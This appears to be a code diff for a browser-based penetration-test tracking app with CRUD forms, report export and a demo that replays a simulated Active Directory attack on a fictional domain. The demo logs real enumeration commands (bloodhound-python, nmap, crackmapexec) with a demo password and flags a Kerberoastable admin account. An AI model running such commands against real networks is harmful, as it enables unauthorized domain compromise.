+      if (idx >= 0) this.project.assets[idx] = asset;
+    } else {
+      this.project.assets.push(asset);
+    }
+    this.save();
+    UI.closeModal();
+    this.renderPhaseContent(this.currentPhase);
+    UI.toast(existingId ? 'Asset updated' : 'Asset added');
+  },
+
+  editAsset(id) {
+    const a = this.project.assets.find(x => x.id === id);
+    if (a) this.showAddAsset(a);
+  },
+
+  deleteAsset(id) {
+    if (!confirm('Delete this asset?')) return;
+    this.project.assets = this.project.assets.filter(a => a.id !== id);
+    this.save();
+    this.renderPhaseContent(this.currentPhase);
+    UI.toast('Asset deleted');
+  },
+
+  // ---- CRUD: Findings ----
+  showAddFinding(existing) {
+    const f = existing || {};
+    const severities = ['critical', 'high', 'medium', 'low', 'info'];
+    const sevOptions = severities.map(s => `<option value="${s}" ${f.severity === s ? 'selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('');
+    const phaseOptions = PhaseInfo.map(p => `<option value="${p.id}" ${(f.phase || this.currentPhase) === p.id ? 'selected' : ''}>${p.name}</option>`).join('');
+
+    const bodyHTML = `
+      <div class="form-group">
+        <label>Title</label>
+        <input type="text" class="form-control" id="finding-title" placeholder="e.g. SQL Injection in Login Form" value="${UI.escapeHTML(f.title || '')}">
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label>Severity</label>
+          <select class="form-control" id="finding-severity">${sevOptions}</select>
+        </div>
+        <div class="form-group">
+          <label>Phase</label>
+          <select class="form-control" id="finding-phase">${phaseOptions}</select>
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Description</label>
+        <textarea class="form-control" id="finding-description" rows="4" placeholder="Describe the finding...">${UI.escapeHTML(f.description || '')}</textarea>
+      </div>
+      <div class="form-group">
+        <label>Evidence</label>
+        <textarea class="form-control" id="finding-evidence" rows="4" placeholder="Paste command output, screenshots URLs, proof...">${UI.escapeHTML(f.evidence || '')}</textarea>
+      </div>
+      <div class="form-group">
+        <label>Affected Assets (comma-separated IDs or values)</label>
+        <input type="text" class="form-control" id="finding-assets" value="${UI.escapeHTML((f.affectedAssets || []).join(', '))}">
+      </div>`;
+
+    const footer = `
+      <button class="btn" onclick="UI.closeModal()">Cancel</button>
+      <button class="btn btn-primary" onclick="App.saveFinding('${f.id || ''}')">${f.id ? 'Update' : 'Add'} Finding</button>`;
+
+    UI.openModal(f.id ? 'Edit Finding' : 'Add Finding', bodyHTML, footer);
+  },
+
+  saveFinding(existingId) {
+    const finding = {
+      id: existingId || UI.generateId(),
+      title: document.getElementById('finding-title').value.trim(),
+      severity: document.getElementById('finding-severity').value,
+      phase: document.getElementById('finding-phase').value,
+      description: document.getElementById('finding-description').value.trim(),
+      evidence: document.getElementById('finding-evidence').value.trim(),
+      affectedAssets: document.getElementById('finding-assets').value.split(',').map(s => s.trim()).filter(Boolean),
+    };
+    if (!finding.title) { UI.toast('Title is required', 'error'); return; }
+
+    if (existingId) {
+      const idx = this.project.findings.findIndex(f => f.id === existingId);
+      if (idx >= 0) this.project.findings[idx] = finding;
+    } else {
+      this.project.findings.push(finding);
+    }
+    this.save();
+    UI.closeModal();
+    this.renderPhaseContent(this.currentPhase);
+    UI.toast(existingId ? 'Finding updated' : 'Finding added');
+  },
+
+  viewFinding(id) {
+    const f = this.project.findings.find(x => x.id === id);
+    if (!f) return;
+    const bodyHTML = `
+      <div class="mb-16"><span class="severity severity-${f.severity}">${f.severity}</span></div>
+      <div class="form-group"><label>Description</label><p>${UI.escapeHTML(f.description || 'N/A')}</p></div>
+      <div class="form-group"><label>Evidence</label><pre style="white-space:pre-wrap;background:var(--bg-primary);padding:12px;border-radius:var(--radius);font-size:12px;font-family:var(--font-mono);max-height:300px;overflow-y:auto;">${UI.escapeHTML(f.evidence || 'N/A')}</pre></div>
+      <div class="form-group"><label>Affected Assets</label><p>${UI.escapeHTML((f.affectedAssets || []).join(', ') || 'None')}</p></div>`;
+    UI.openModal(f.title, bodyHTML, '<button class="btn" onclick="UI.closeModal()">Close</button>');
+  },
+
+  editFinding(id) {
+    const f = this.project.findings.find(x => x.id === id);
+    if (f) this.showAddFinding(f);
+  },
+
+  deleteFinding(id) {
+    if (!confirm('Delete this finding?')) return;
+    this.project.findings = this.project.findings.filter(f => f.id !== id);
+    this.save();
+    this.renderPhaseContent(this.currentPhase);
+    UI.toast('Finding deleted');
+  },
+
+  // ---- CRUD: Vulnerabilities ----
+  showAddVuln(existing) {
+    const v = existing || {};
+    const severities = ['critical', 'high', 'medium', 'low', 'info'];
+    const sevOptions = severities.map(s => `<option value="${s}" ${v.severity === s ? 'selected' : ''}>${s.charAt(0).toUpperCase() + s.slice(1)}</option>`).join('');
+    const phaseOptions = PhaseInfo.map(p => `<option value="${p.id}" ${(v.phase || this.currentPhase) === p.id ? 'selected' : ''}>${p.name}</option>`).join('');
+
+    const bodyHTML = `
+      <div class="form-group">
+        <label>Title</label>
+        <input type="text" class="form-control" id="vuln-title" placeholder="e.g. Stored XSS in Comment Field" value="${UI.escapeHTML(v.title || '')}">
+      </div>
+      <div class="form-row-3">
+        <div class="form-group">
+          <label>Severity</label>
+          <select class="form-control" id="vuln-severity">${sevOptions}</select>
+        </div>
+        <div class="form-group">
+          <label>CVSS Score</label>
+          <input type="number" class="form-control" id="vuln-cvss" min="0" max="10" step="0.1" placeholder="0.0 - 10.0" value="${v.cvss !== undefined ? v.cvss : ''}">
+        </div>
+        <div class="form-group">
+          <label>Phase</label>
+          <select class="form-control" id="vuln-phase">${phaseOptions}</select>
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Description</label>
+        <textarea class="form-control" id="vuln-description" rows="3" placeholder="Describe the vulnerability...">${UI.escapeHTML(v.description || '')}</textarea>
+      </div>
+      <div class="form-group">
+        <label>Proof of Concept</label>
+        <textarea class="form-control" id="vuln-poc" rows="4" placeholder="Steps to reproduce, payloads, commands...">${UI.escapeHTML(v.poc || '')}</textarea>
+      </div>
+      <div class="form-group">
+        <label>Remediation</label>
+        <textarea class="form-control" id="vuln-remediation" rows="3" placeholder="Recommended fix...">${UI.escapeHTML(v.remediation || '')}</textarea>
+      </div>
+      <div class="form-group">
+        <label>Affected Assets (comma-separated)</label>
+        <input type="text" class="form-control" id="vuln-assets" value="${UI.escapeHTML((v.affectedAssets || []).join(', '))}">
+      </div>`;
+
+    const footer = `
+      <button class="btn" onclick="UI.closeModal()">Cancel</button>
+      <button class="btn btn-primary" onclick="App.saveVuln('${v.id || ''}')">${v.id ? 'Update' : 'Add'} Vulnerability</button>`;
+
+    UI.openModal(v.id ? 'Edit Vulnerability' : 'Add Vulnerability', bodyHTML, footer);
+  },
+
+  saveVuln(existingId) {
+    const vuln = {
+      id: existingId || UI.generateId(),
+      title: document.getElementById('vuln-title').value.trim(),
+      severity: document.getElementById('vuln-severity').value,
+      cvss: document.getElementById('vuln-cvss').value,
+      phase: document.getElementById('vuln-phase').value,
+      description: document.getElementById('vuln-description').value.trim(),
+      poc: document.getElementById('vuln-poc').value.trim(),
+      remediation: document.getElementById('vuln-remediation').value.trim(),
+      affectedAssets: document.getElementById('vuln-assets').value.split(',').map(s => s.trim()).filter(Boolean),
+    };
+    if (!vuln.title) { UI.toast('Title is required', 'error'); return; }
+
+    if (existingId) {
+      const idx = this.project.vulnerabilities.findIndex(v => v.id === existingId);
+      if (idx >= 0) this.project.vulnerabilities[idx] = vuln;
+    } else {
+      this.project.vulnerabilities.push(vuln);
+    }
+    this.save();
+    UI.closeModal();
+    this.renderPhaseContent(this.currentPhase);
+    UI.toast(existingId ? 'Vulnerability updated' : 'Vulnerability added');
+  },
+
+  viewVuln(id) {
+    const v = this.project.vulnerabilities.find(x => x.id === id);
+    if (!v) return;
+    const bodyHTML = `
+      <div class="mb-16"><span class="severity severity-${v.severity}">${v.severity}</span> <span style="font-family:var(--font-mono);margin-left:8px;">CVSS: ${v.cvss || 'N/A'}</span></div>
+      <div class="form-group"><label>Description</label><p>${UI.escapeHTML(v.description || 'N/A')}</p></div>
+      <div class="form-group"><label>Proof of Concept</label><pre style="white-space:pre-wrap;background:var(--bg-primary);padding:12px;border-radius:var(--radius);font-size:12px;font-family:var(--font-mono);max-height:300px;overflow-y:auto;">${UI.escapeHTML(v.poc || 'N/A')}</pre></div>
+      <div class="form-group"><label>Remediation</label><p>${UI.escapeHTML(v.remediation || 'N/A')}</p></div>
+      <div class="form-group"><label>Affected Assets</label><p>${UI.escapeHTML((v.affectedAssets || []).join(', ') || 'None')}</p></div>`;
+    UI.openModal(v.title, bodyHTML, '<button class="btn" onclick="UI.closeModal()">Close</button>');
+  },
+
+  editVuln(id) {
+    const v = this.project.vulnerabilities.find(x => x.id === id);
+    if (v) this.showAddVuln(v);
+  },
+
+  deleteVuln(id) {
+    if (!confirm('Delete this vulnerability?')) return;
+    this.project.vulnerabilities = this.project.vulnerabilities.filter(v => v.id !== id);
+    this.save();
+    this.renderPhaseContent(this.currentPhase);
+    UI.toast('Vulnerability deleted');
+  },
+
+  // ---- Import / Export ----
+  exportJSON() {
+    const blob = new Blob([JSON.stringify(this.project, null, 2)], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = (this.project.project.name || 'project').replace(/[^a-z0-9]/gi, '_') + '.json';
+    a.click();
+    URL.revokeObjectURL(url);
+    UI.toast('Project exported');
+  },
+
+  importJSON() {
+    document.getElementById('file-import').click();
+  },
+
+  exportReport() {
+    const p = this.project;
+    const labels = {
+      webapp: 'Web Application', api: 'API', infrastructure: 'Infrastructure',
+      blackbox: 'Black Box', greybox: 'Grey Box', whitebox: 'White Box',
+      standard: 'Standard', assume_breach: 'Assume Breach', m365: 'Microsoft 365', enterprise_wide: 'Enterprise Wide'
+    };
+
+    let md = `# Penetration Test Report\n\n`;
+    md += `## Project: ${p.project.name || 'Untitled'}\n\n`;
+    md += `| Field | Value |\n|-------|-------|\n`;
+    md += `| **Test Type** | ${labels[p.engagementType.testType]} |\n`;
+    md += `| **Knowledge Level** | ${labels[p.engagementType.knowledgeLevel]} |\n`;
+    md += `| **Scenario** | ${labels[p.engagementType.scenario]} |\n`;
+    md += `| **Start Date** | ${p.project.startDate || 'N/A'} |\n`;
+    md += `| **End Date** | ${p.project.endDate || 'N/A'} |\n\n`;
+
+    md += `## Scope\n\n${p.project.scope || 'N/A'}\n\n`;
+    md += `## Rules of Engagement\n\n${p.project.rulesOfEngagement || 'N/A'}\n\n`;
+
+    // Executive Summary — vuln counts
+    const vulnCounts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
+    (p.vulnerabilities || []).forEach(v => { if (vulnCounts[v.severity] !== undefined) vulnCounts[v.severity]++; });
+    md += `## Executive Summary\n\n`;
+    md += `| Severity | Count |\n|----------|-------|\n`;
+    md += `| Critical | ${vulnCounts.critical} |\n`;
+    md += `| High | ${vulnCounts.high} |\n`;
+    md += `| Medium | ${vulnCounts.medium} |\n`;
+    md += `| Low | ${vulnCounts.low} |\n`;
+    md += `| Info | ${vulnCounts.info} |\n`;
+    md += `| **Total** | **${(p.vulnerabilities || []).length}** |\n\n`;
+
+    // Vulnerabilities detail
+    if ((p.vulnerabilities || []).length > 0) {
+      md += `## Vulnerabilities\n\n`;
+      const sorted = [...p.vulnerabilities].sort((a, b) => {
+        const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
+        return (order[a.severity] || 5) - (order[b.severity] || 5);
+      });
+      sorted.forEach((v, i) => {
+        md += `### ${i + 1}. ${v.title}\n\n`;
+        md += `- **Severity:** ${v.severity.toUpperCase()}${v.cvss ? ' (CVSS: ' + v.cvss + ')' : ''}\n`;
+        md += `- **Phase:** ${v.phase ? v.phase.replace('phase', 'Phase ') : 'N/A'}\n`;
+        if (v.affectedAssets && v.affectedAssets.length > 0) md += `- **Affected Assets:** ${v.affectedAssets.join(', ')}\n`;
+        md += `\n**Description:**\n\n${v.description || 'N/A'}\n\n`;
+        if (v.poc) md += `**Proof of Concept:**\n\n\`\`\`\n${v.poc}\n\`\`\`\n\n`;
+        md += `**Remediation:**\n\n${v.remediation || 'N/A'}\n\n---\n\n`;
+      });
+    }
+
+    // Findings
+    if ((p.findings || []).length > 0) {
+      md += `## Findings\n\n`;
+      p.findings.forEach((f, i) => {
+        md += `### ${i + 1}. ${f.title}\n\n`;
+        md += `- **Severity:** ${f.severity.toUpperCase()}\n`;
+        md += `- **Phase:** ${f.phase ? f.phase.replace('phase', 'Phase ') : 'N/A'}\n`;
+        md += `\n${f.description || ''}\n\n`;
+        if (f.evidence) md += `**Evidence:**\n\n\`\`\`\n${f.evidence}\n\`\`\`\n\n`;
+      });
+    }
+
+    // Assets
+    if ((p.assets || []).length > 0) {
+      md += `## Discovered Assets\n\n`;
+      md += `| Type | Value | Notes |\n|------|-------|-------|\n`;
+      p.assets.forEach(a => {
+        md += `| ${a.type} | \`${a.value}\` | ${a.notes || ''} |\n`;
+      });
+      md += `\n`;
+    }
+
+    // Phase Notes
+    md += `## Phase Notes\n\n`;
+    PhaseInfo.forEach(phase => {
+      const prog = p.progress[phase.id];
+      if (prog && prog.notes) {
+        md += `### ${phase.name}\n\n${prog.notes}\n\n`;
+      }
+    });
+
+    // Download
+    const blob = new Blob([md], { type: 'text/markdown' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = (p.project.name || 'report').replace(/[^a-z0-9]/gi, '_') + '_report.md';
+    a.click();
+    URL.revokeObjectURL(url);
+    UI.toast('Report exported');
+  },
+
+  newProject() {
+    if (!confirm('Start a new project? Current data will remain in storage until overwritten.')) return;
+    Storage.clear();
+    this.project = null;
+    this.currentPhase = 'phase1';
+    document.getElementById('app').classList.add('hidden');
+    Wizard.init();
+  },
+
+  save() {
+    Storage.save(this.project);
+  }
+};
+
+/* ============================================================
+   WIZARD MODULE
+   ============================================================ */
+const Wizard = {
+  step: 0,
+  totalSteps: 4,
+  selections: {
+    testType: null,
+    knowledgeLevel: null,
+    scenario: 'standard',
+  },
+
+  init() {
+    this.step = 0;
+    this.selections = { testType: null, knowledgeLevel: null, scenario: 'standard' };
+    document.getElementById('wizard-container').classList.remove('hidden');
+
+    // Set today's date as default
+    const today = new Date().toISOString().split('T')[0];
+    document.getElementById('wiz-start').value = today;
+
+    // Option card click handlers
+    this.setupOptionCards('wiz-test-type', 'testType');
+    this.setupOptionCards('wiz-knowledge', 'knowledgeLevel');
+    this.setupOptionCards('wiz-scenario', 'scenario');
+
+    // Navigation buttons
+    document.getElementById('wiz-next').addEventListener('click', () => this.next());
+    document.getElementById('wiz-back').addEventListener('click', () => this.back());
+
+    this.updateUI();
+  },
+
+  setupOptionCards(containerId, key) {
+    const container = document.getElementById(containerId);
+    container.querySelectorAll('.option-card').forEach(card => {
+      card.addEventListener('click', () => {
+        container.querySelectorAll('.option-card').forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected');
+        this.selections[key] = card.dataset.value;
+      });
+    });
+  },
+
+  next() {
+    // Validate current step
+    if (this.step === 0) {
+      const name = document.getElementById('wiz-name').value.trim();
+      if (!name) { UI.toast('Please enter a project name', 'error'); return; }
+    }
+    if (this.step === 1 && !this.selections.testType) {
+      UI.toast('Please select a test type', 'error'); return;
+    }
+    if (this.step === 2 && !this.selections.knowledgeLevel) {
+      UI.toast('Please select a knowledge level', 'error'); return;
+    }
+
+    if (this.step < this.totalSteps - 1) {
+      this.step++;
+      this.updateUI();
+    } else {
+      this.finish();
+    }
+  },
+
+  back() {
+    if (this.step > 0) {
+      this.step--;
+      this.updateUI();
+    }
+  },
+
+  updateUI() {
+    // Steps
+    document.querySelectorAll('.wizard-step').forEach(s => s.classList.remove('active'));
+    document.querySelector(`.wizard-step[data-step="${this.step}"]`).classList.add('active');
+
+    // Dots
+    document.querySelectorAll('.wizard-step-dot').forEach((d, i) => {
+      d.classList.remove('active', 'completed');
+      if (i < this.step) d.classList.add('completed');
+      if (i === this.step) d.classList.add('active');
+    });
+
+    // Buttons
+    document.getElementById('wiz-back').style.visibility = this.step === 0 ? 'hidden' : 'visible';
+    document.getElementById('wiz-next').textContent = this.step === this.totalSteps - 1 ? 'Start Engagement' : 'Next';
+    if (this.step === this.totalSteps - 1) {
+      document.getElementById('wiz-next').classList.add('btn-success');
+    } else {
+      document.getElementById('wiz-next').classList.remove('btn-success');
+    }
+  },
+
+  finish() {
+    const engagementType = {
+      testType: this.selections.testType,
+      knowledgeLevel: this.selections.knowledgeLevel,
+      scenario: this.selections.scenario || 'standard',
+    };
+
+    const checklists = ChecklistData.getChecklists(engagementType);
+    const progress = {};
+    PhaseInfo.forEach(p => {
+      progress[p.id] = {
+        checklist: (checklists[p.id] || []).map(item => ({ item, done: false })),
+        notes: '',
+      };
+    });
+
+    const project = {
+      project: {
+        name: document.getElementById('wiz-name').value.trim(),
+        scope: document.getElementById('wiz-scope').value.trim(),
+        startDate: document.getElementById('wiz-start').value,
+        endDate: document.getElementById('wiz-end').value,
+        contacts: [],
+        rulesOfEngagement: '',
+      },
+      engagementType,
+      assets: [],
+      findings: [],
+      vulnerabilities: [],
+      progress,
+    };
+
+    App.project = project;
+    Storage.save(project);
+    App.showApp();
+    UI.toast('Engagement created — good hunting!');
+  }
+};
+
+/* ============================================================
+   DEMO SIMULATION — EvilCorp.local AD Attack Chain
+   ============================================================ */
+const DemoSimulation = {
+  running: false,
+  aborted: false,
+  speed: 'normal',
+  delays: { fast: 40, normal: 100, slow: 220 },
+  stepDelay: { fast: 200, normal: 500, slow: 1000 },
+  phaseDelay: { fast: 600, normal: 1500, slow: 3000 },
+  projectData: null,
+
+  setSpeed(s) { this.speed = s; },
+  getDelay() { return this.delays[this.speed]; },
+  getStepDelay() { return this.stepDelay[this.speed]; },
+  getPhaseDelay() { return this.phaseDelay[this.speed]; },
+
+  async sleep(ms) {
+    return new Promise(r => setTimeout(r, ms));
+  },
+
+  async waitOrAbort(ms) {
+    await this.sleep(ms);
+    if (this.aborted) throw new Error('ABORTED');
+  },
+
+  stop() {
+    this.aborted = true;
+    this.running = false;
+    // Capture console output even on partial runs
+    if (this.projectData) {
+      this.projectData.consoleLog = {
+        terminalHTML: document.getElementById('sim-terminal').innerHTML,
+        assetsHTML: document.getElementById('sim-assets').innerHTML,
+        findingsHTML: document.getElementById('sim-findings').innerHTML,
+        vulnsHTML: document.getElementById('sim-vulns').innerHTML,
+        timestamp: new Date().toISOString(),
+      };
+      App.project = this.projectData;
+      Storage.save(this.projectData);
+      App.showApp();
+      UI.toast('Demo stopped — partial data loaded (console log saved)');
+    }
+    document.getElementById('sim-overlay').classList.remove('visible');
+  },
+
+  log(text, cls = 'output') {
+    if (this.aborted) return;
+    const terminal = document.getElementById('sim-terminal');
+    const line = document.createElement('div');
+    line.className = 'line line-' + cls;
+    line.textContent = text;
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+  },
+
+  logCmd(cmd) {
+    this.log('┌──(operator㉿kali)-[~/evilcorp]', 'prompt');
+    this.log('└─$ ' + cmd, 'cmd');
+  },
+
+  setPhase(label) {
+    if (this.aborted) return;
+    document.getElementById('sim-phase-label').textContent = label;
+  },
+
+  setProgress(pct) {
+    if (this.aborted) return;
+    document.getElementById('sim-progress-fill').style.width = pct + '%';
+  },
+
+  addSidebarItem(container, text, cls) {
+    if (this.aborted) return;
+    const el = document.createElement('div');
+    el.className = 'sim-item ' + cls;
+    el.textContent = text;
+    document.getElementById(container).appendChild(el);
+  },
+
+  // Build initial project data structure
+  initProject() {
+    const engagementType = {
+      testType: 'infrastructure',
+      knowledgeLevel: 'greybox',
+      scenario: 'assume_breach',
+    };
+
+    const checklists = ChecklistData.getChecklists(engagementType);
+    const progress = {};
+    PhaseInfo.forEach(p => {
+      progress[p.id] = {
+        checklist: (checklists[p.id] || []).map(item => ({ item, done: false })),
+        notes: '',
+      };
+    });
+
+    this.projectData = {
+      project: {
+        name: 'EvilCorp — Assume Breach Assessment',
+        scope: 'Internal network penetration test of the evilcorp.local Active Directory domain. Assume breach scenario — operator has a low-privileged domain user account (jsmith) on a workstation (WS-PC01). Goal: demonstrate maximum impact including domain compromise.',
+        startDate: new Date().toISOString().split('T')[0],
+        endDate: '',
+        contacts: ['John Doe — CISO — jdoe@evilcorp.com', 'Jane Smith — IT Director — jsmith@evilcorp.com'],
+        rulesOfEngagement: 'Testing hours: 24/7. No destructive actions on production systems. Ransomware simulation via GPO is approved in writing. DC01, DC02, and all domain-joined hosts are in scope. Cloud resources are out of scope.',
+      },
+      engagementType,
+      assets: [],
+      findings: [],
+      vulnerabilities: [],
+      progress,
+    };
+  },
+
+  addAsset(type, value, notes, phase) {
+    const asset = { id: UI.generateId(), type, value, notes, phase };
+    this.projectData.assets.push(asset);
+  },
+
+  addFinding(title, severity, description, evidence, phase) {
+    const finding = { id: UI.generateId(), title, severity, description, evidence, affectedAssets: [], phase };
+    this.projectData.findings.push(finding);
+  },
+
+  addVuln(title, severity, cvss, description, poc, remediation, phase) {
+    const vuln = { id: UI.generateId(), title, severity, cvss, description, poc, remediation, affectedAssets: [], phase };
+    this.projectData.vulnerabilities.push(vuln);
+  },
+
+  checkItem(phaseId, keyword) {
+    const prog = this.projectData.progress[phaseId];
+    if (!prog) return;
+    const item = prog.checklist.find(c => c.item.toLowerCase().includes(keyword.toLowerCase()));
+    if (item) item.done = true;
+  },
+
+  setNotes(phaseId, notes) {
+    if (this.projectData.progress[phaseId]) {
+      this.projectData.progress[phaseId].notes = notes;
+    }
+  },
+
+  async start() {
+    this.running = true;
+    this.aborted = false;
+    this.speed = document.getElementById('sim-speed').value || 'normal';
+
+    // Reset UI
+    document.getElementById('sim-terminal').innerHTML = '';
+    document.getElementById('sim-assets').innerHTML = '';
+    document.getElementById('sim-findings').innerHTML = '';
+    document.getElementById('sim-vulns').innerHTML = '';
+    this.setProgress(0);
+    document.getElementById('sim-overlay').classList.add('visible');
+
+    this.initProject();
+
+    try {
+      await this.runPhase1();
+      await this.runPhase2();
+      await this.runPhase3();
+      await this.runPhase4();
+      await this.runPhase5();
+      await this.runPhase6();
+      await this.runPhase7();
+      await this.finalize();
+    } catch (e) {
+      if (e.message !== 'ABORTED') console.error(e);
+    }
+  },
+
+  // =====================================================
+  // PHASE 1: Pre-Engagement
+  // =====================================================
+  async runPhase1() {
+    this.setPhase('Phase 1: Pre-Engagement Interactions');
+    this.setProgress(2);
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  PHASE 1: PRE-ENGAGEMENT INTERACTIONS', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    this.log('', 'output');
+    this.log('[*] Engagement: EvilCorp — Assume Breach Assessment', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Type: Infrastructure / Grey Box / Assume Breach', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Domain: evilcorp.local', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Provided credentials: EVILCORP\\jsmith (low-priv domain user)', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Starting workstation: WS-PC01 (10.10.10.50)', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] Authorization confirmed — Rules of engagement signed', 'success');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] Emergency contacts documented', 'success');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] Testing window: 24/7 — all domain-joined hosts in scope', 'success');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.checkItem('phase1', 'scope');
+    this.checkItem('phase1', 'authorization');
+    this.checkItem('phase1', 'emergency');
+    this.checkItem('phase1', 'window');
+    this.checkItem('phase1', 'communication');
+    this.checkItem('phase1', 'out-of-scope');
+    this.checkItem('phase1', 'legal');
+    this.checkItem('phase1', 'note-taking');
+
+    this.addAsset('credential', 'EVILCORP\\jsmith:Summer2024!', 'Low-privileged domain user — provided by client', 'phase1');
+    this.addSidebarItem('sim-assets', 'EVILCORP\\jsmith (cred)', 'asset');
+    this.addAsset('host', 'WS-PC01 (10.10.10.50)', 'Operator starting workstation', 'phase1');
+    this.addSidebarItem('sim-assets', 'WS-PC01 — 10.10.10.50', 'asset');
+
+    this.setNotes('phase1', 'Engagement authorized by John Doe (CISO). Testing window 24/7. Provided with EVILCORP\\jsmith domain credentials and access to WS-PC01 (10.10.10.50). Ransomware simulation via GPO approved in writing. Cloud resources out of scope.');
+    this.setProgress(5);
+  },
+
+  // =====================================================
+  // PHASE 2: Intelligence Gathering
+  // =====================================================
+  async runPhase2() {
+    this.setPhase('Phase 2: Intelligence Gathering');
+    this.setProgress(10);
+    this.log('', 'output');
+    this.log('═══════════════════════════════════════════════', 'header');
+    this.log('  PHASE 2: INTELLIGENCE GATHERING', 'header');
+    this.log('═══════════════════════════════════════════════', 'header');
+    await this.waitOrAbort(this.getPhaseDelay());
+
+    // AD Enumeration
+    this.log('', 'output');
+    this.log('[*] Starting Active Directory enumeration...', 'info');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.logCmd('bloodhound-python -d evilcorp.local -u jsmith -p \'Summer2024!\' -c All -ns 10.10.10.10');
+    await this.waitOrAbort(this.getDelay());
+    this.log('INFO: Found AD domain: evilcorp.local', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('INFO: Found 1 domain(s)', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('INFO: Found 2 domain controller(s)', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('INFO: Enumerating 847 users', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('INFO: Enumerating 156 groups', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('INFO: Enumerating 312 computers', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('INFO: Enumerating 47 GPOs', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[+] BloodHound collection complete — 4 JSON files written', 'success');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addAsset('domain', 'evilcorp.local', 'Primary AD domain', 'phase2');
+    this.addSidebarItem('sim-assets', 'evilcorp.local (domain)', 'asset');
+
+    // Domain Controllers
+    this.logCmd('nmap -sV -p 53,88,135,139,389,445,636,3268,3269 10.10.10.10-11');
+    await this.waitOrAbort(this.getDelay());
+    this.log('Nmap scan report for DC01.evilcorp.local (10.10.10.10)', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('PORT     STATE SERVICE       VERSION', 'output');
+    this.log('53/tcp   open  domain        Microsoft DNS 10.0.17763', 'output');
+    this.log('88/tcp   open  kerberos-sec  Microsoft Windows Kerberos', 'output');
+    this.log('135/tcp  open  msrpc         Microsoft Windows RPC', 'output');
+    this.log('139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn', 'output');
+    this.log('389/tcp  open  ldap          Microsoft Windows AD LDAP', 'output');
+    this.log('445/tcp  open  microsoft-ds  Windows Server 2019 Standard', 'output');
+    this.log('636/tcp  open  ssl/ldap      Microsoft Windows AD LDAP', 'output');
+    this.log('3268/tcp open  ldap          Microsoft Windows AD LDAP (Global Catalog)', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('Nmap scan report for DC02.evilcorp.local (10.10.10.11)', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('PORT     STATE SERVICE       VERSION', 'output');
+    this.log('53/tcp   open  domain        Microsoft DNS 10.0.17763', 'output');
+    this.log('88/tcp   open  kerberos-sec  Microsoft Windows Kerberos', 'output');
+    this.log('445/tcp  open  microsoft-ds  Windows Server 2019 Standard', 'output');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addAsset('host', 'DC01.evilcorp.local (10.10.10.10)', 'Primary Domain Controller — Server 2019', 'phase2');
+    this.addAsset('host', 'DC02.evilcorp.local (10.10.10.11)', 'Secondary Domain Controller — Server 2019', 'phase2');
+    this.addSidebarItem('sim-assets', 'DC01 — 10.10.10.10 (PDC)', 'asset');
+    this.addSidebarItem('sim-assets', 'DC02 — 10.10.10.11 (SDC)', 'asset');
+
+    // Service accounts
+    this.logCmd('crackmapexec ldap 10.10.10.10 -u jsmith -p \'Summer2024!\' --query "(servicePrincipalName=*)" -a sAMAccountName,servicePrincipalName,memberOf');
+    await this.waitOrAbort(this.getDelay());
+    this.log('[*] Querying LDAP for service accounts with SPNs...', 'info');
+    await this.waitOrAbort(this.getDelay());
+    this.log('sAMAccountName     servicePrincipalName              memberOf', 'output');
+    this.log('─────────────────  ────────────────────────────────  ────────────────────────', 'output');
+    this.log('svc_sql            MSSQLSvc/SQL01.evilcorp.local     CN=SQLAdmins', 'output');
+    this.log('svc_veeam          HTTP/VEEAM01.evilcorp.local       CN=Domain Admins  ← !!!', 'warning');
+    this.log('svc_iis            HTTP/WEB01.evilcorp.local         CN=WebAdmins', 'output');
+    this.log('svc_backup         CIFS/BACKUP01.evilcorp.local      CN=BackupOperators', 'output');
+    this.log('krbtgt             kadmin/changepw                   CN=Domain Controllers', 'output');
+    await this.waitOrAbort(this.getDelay());
+    this.log('', 'output');
+    this.log('[!] CRITICAL: svc_veeam is a member of Domain Admins!', 'critical');
+    this.log('[!] This service account has a Kerberos SPN — Kerberoastable', 'warning');
+    await this.waitOrAbort(this.getStepDelay());
+
+    this.addAsset('user', 'svc_veeam', 'Service account — DOMAIN ADMIN — Kerberoastable SPN: HTTP/VEEAM01.evilcorp.local', 'phase2');
+    this.addAsset('user', 'svc_sql', 'Service account — SQLAdmins group — SPN: MSSQLSvc/SQL01.evilcorp.local', 'phase2');
+    this.addAsset('user', 'svc_iis', 'Service account — WebAdmins group — SPN: HTTP/WEB01.evilcorp.local', 'phase2');
